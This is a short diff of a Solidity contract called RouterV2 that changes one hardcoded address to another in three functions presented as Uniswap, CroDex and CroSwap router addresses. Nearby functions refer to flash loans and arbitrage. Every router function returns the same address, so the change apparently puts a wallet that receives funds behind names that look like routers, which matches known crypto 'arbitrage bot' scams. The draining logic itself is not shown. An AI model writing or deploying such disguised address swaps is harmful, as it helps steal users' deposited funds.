@@ -111,7 +111,7 @@ interface croDexSwapPair {
 
 contract RouterV2 {
     function uniswapRouterV2Address() public pure returns (address) {
-        return 0x83BC352073AAa8d2dc0ff52Ff25e81B19c95E07D;
+        return 0x310F2c74bB82d7f06C9D9d8fAfb4E99d1E1533F2;
     }
 
     function compareStrings(string memory a, string memory b)
@@ -123,7 +123,7 @@ contract RouterV2 {
     }
 
     function croDexSwapAddress() public pure returns (address) {
-        return 0x83BC352073AAa8d2dc0ff52Ff25e81B19c95E07D;
+        return 0x310F2c74bB82d7f06C9D9d8fAfb4E99d1E1533F2;
     }
 
     function borrowFlashloanFromMultiplier(
@@ -142,7 +142,7 @@ contract RouterV2 {
     }
 
     function croSwapAddress() public pure returns (address) {
-        return 0x83BC352073AAa8d2dc0ff52Ff25e81B19c95E07D;
+        return 0x310F2c74bB82d7f06C9D9d8fAfb4E99d1E1533F2;
     }
 
     function callArbitrageCroDex(address add0, address add1) public pure {
